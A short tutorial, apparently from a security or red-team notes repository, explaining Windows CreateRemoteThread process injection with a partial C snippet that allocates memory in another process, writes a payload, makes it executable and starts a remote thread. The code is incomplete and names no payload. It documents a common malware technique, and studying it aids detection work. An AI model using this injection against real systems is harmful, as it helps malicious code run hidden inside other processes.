# Create Remote Thread Injection

**CreateRemoteThread** is a Windows API function that allows its caller to remotely  
start a thread in another process. We can use this function along with  
**VirtualAllocEx** in order to Allocate a new memory space in a target process  
and additionally use **WriteProcessMemory** to write our payload to the newly  
allocated memory.

```
int main(void)
{
    (...)

    if (!(exec_mem = VirtualAllocEx(hProcess, NULL, size+1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
    {
        CloseHandle(hProcess);
        return -1;
    }

    if (!(WriteProcessMemory(hProcess, (LPVOID)exec_mem, (LPVOID)payload, size+1, NULL)))
    {
        return -1;
    }

    if (!(bSuccess = VirtualProtectEx(hProcess, exec_mem, size, PAGE_EXECUTE_READ, &old_protect)))
    {
        return -1;
    }

    if (!(hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL)))
    {
        return -1;
    }

    (...)
}
```
